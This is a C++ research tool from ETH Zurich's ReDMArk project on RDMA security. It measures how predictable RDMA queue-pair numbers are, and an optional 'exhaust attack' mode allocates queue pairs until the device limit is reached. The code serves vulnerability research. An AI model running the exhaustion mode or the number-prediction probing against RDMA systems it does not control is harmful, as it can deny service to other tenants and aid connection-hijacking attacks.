/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Launch a test to show predictability of QP numbers and the current limit on the number of allocated QPs. 
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <infiniband/verbs.h>
#include <inttypes.h>
#include <sys/mman.h>

#include <list>
#include <map>
#include <iostream>
#include <string>
#include "cxxopts.hpp"


cxxopts::ParseResult
parse(int argc, char* argv[])
{
  cxxopts::Options options(argv[0], "\
QP tests.\n\
The first test checks QP numbers.\n\
the second test tries to exhaust QP allocation.");
  options.positional_help("[optional args]")
  .show_positional_help();
 
  try
  {

    options.add_options()
      ("n,num", "number of QPs", cxxopts::value<uint32_t>()->default_value("20"), "N")
      ("d,dev", "ib device", cxxopts::value<std::string>(), "name")
      ("exhaust", "run exhaust attack")
      ("help", "Print help")
     ;

    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

 

static struct ibv_device *
ibFindDevice(const char *name)
{
  struct ibv_device **devices;

  devices = ibv_get_device_list(NULL);
  if (devices == NULL)
    return NULL;

  if (name == NULL)
    return devices[0];

  for (int i = 0; devices[i] != NULL; i++) {
    if (strcmp(devices[i]->name, name) == 0)
      return devices[i];
  }

  return NULL;
}


void test_qps(struct ibv_context *ctxt,struct ibv_pd *pd, uint32_t N){
  // register our userspace buffer with the HCA
  struct ibv_cq *cq = ibv_create_cq(ctxt, 1, NULL,NULL,0);
  // fill in a big struct of queue pair parameters
  struct ibv_qp_init_attr qpia;
  memset(&qpia, 0, sizeof(qpia));
  qpia.send_cq = cq;
  qpia.recv_cq = cq;
  qpia.cap.max_send_wr  = 1;  // max outstanding send requests
  qpia.cap.max_recv_wr  = 1;  // max outstanding recv requests
  qpia.cap.max_send_sge = 1;  // max send scatter-gather elements
  qpia.cap.max_recv_sge = 1;  // max recv scatter-gather elements
  qpia.cap.max_inline_data = 0;   // max bytes of immediate data on send q
  qpia.qp_type = IBV_QPT_RC;  // RC, UC, UD, or XRC
  qpia.sq_sig_all = 0;        // only generate CQEs on requested WQEs

  uint32_t firstqpn = 0xFFFFFFFF;
  std::vector<uint32_t> all_qpns;
  printf("QP numbers: ");
  for(uint32_t i = 0; i < N; i++){
  // create the queue pair
    struct ibv_qp *qp = ibv_create_qp(pd, &qpia);
    if (qp == NULL) {
        fprintf(stderr, "failed to create queue pair\n");
        exit(1);
    }
    if(firstqpn == qp->qp_num){
      printf("\nThe qpnum was repeated after %u registrations\n",i);
      break;
    }

    if(firstqpn==0xFFFFFFFF){
      firstqpn = qp->qp_num;
    }

    printf("0x%X ",qp->qp_num);
    all_qpns.push_back(qp->qp_num);

    ibv_destroy_qp(qp);
  }


  std::map<long long,int> hist;
  printf("\nQP number offsets: ");
  for(uint32_t i = 1; i<all_qpns.size(); i++){
    long long diff = (long long)all_qpns[i] - (long long)all_qpns[i-1]  ;
    printf("%lld ", diff);
    auto it = hist.find(diff);
    if (it != hist.end()) {
      it->second++;
    } else {
      hist.insert({diff, 1});
    }
  }
  printf("\nHistogram of differences [difference->count]: ");
  for(auto &elem : hist) {
    printf("[%lld->%d] ",elem.first, elem.second);
  }

  printf("\n");
  printf("\n");
}

void test_exhaust(struct ibv_context *ctxt,struct ibv_pd *pd){
    // register our userspace buffer with the HCA
  struct ibv_cq *cq = ibv_create_cq(ctxt, 1, NULL,NULL,0);
    // fill in a big struct of queue pair parameters
  struct ibv_qp_init_attr qpia;
  memset(&qpia, 0, sizeof(qpia));
  qpia.send_cq = cq;
  qpia.recv_cq = cq;
  qpia.cap.max_send_wr  = 1;  // max outstanding send requests
  qpia.cap.max_recv_wr  = 1;  // max outstanding recv requests
  qpia.cap.max_send_sge = 1;  // max send scatter-gather elements
  qpia.cap.max_recv_sge = 1;  // max recv scatter-gather elements
  qpia.cap.max_inline_data = 0;   // max bytes of immediate data on send q
  qpia.qp_type = IBV_QPT_RC;  // RC, UC, UD, or XRC
  qpia.sq_sig_all = 0;        // only generate CQEs on requested WQEs

  std::vector<struct ibv_qp *> all_qps;
  uint32_t maxqp = 0;
  uint32_t minqp = 0xFFFFFFFF;
  uint32_t i = 0;
  while(true){
    struct ibv_qp *qp = ibv_create_qp(pd, &qpia);

    if (qp == NULL) {
        fprintf(stderr, "failed to create queue pair, after: %d\n",i);
        break;
    }
    if(qp->qp_num > maxqp) maxqp = qp->qp_num ;
    if(qp->qp_num < minqp) minqp = qp->qp_num ;
    all_qps.push_back(qp);
    i++;
  }
  printf("The max qpn: %u, The min qpn: %u\n",maxqp,minqp);
  for( auto qp : all_qps){
  // create the queue pair
    //printf("%u ",qp->qp_num);
    ibv_destroy_qp(qp);
  }
  
}

int
main(int argc, char **argv)
{

  auto allparams = parse(argc,argv);
 
  uint32_t qpn_num = allparams["num"].as<uint32_t>();

  struct ibv_device *dev = NULL;

  const char * devname = NULL;
  if(allparams.count("dev")){
      devname = allparams["dev"].as<std::string>().c_str();
  }

  dev = ibFindDevice(devname);
  if (dev == NULL) {
    fprintf(stderr, "failed to find infiniband device\n");
    exit(1);
  }

  printf("Using ib device `%s'.\n", dev->name);

  struct ibv_context *ctxt = ibv_open_device(dev);
  if (ctxt == NULL) {
    fprintf(stderr, "failed to open infiniband device\n");
    exit(1);
  }

  struct ibv_pd *pd = ibv_alloc_pd(ctxt);
  if (pd == NULL) {
    fprintf(stderr, "failed to allocate protection domain\n");
    exit(1);
  }

  test_qps(ctxt,pd,qpn_num);

  if(allparams.count("exhaust")){
    test_exhaust(ctxt,pd);
  }

  return 0;
}
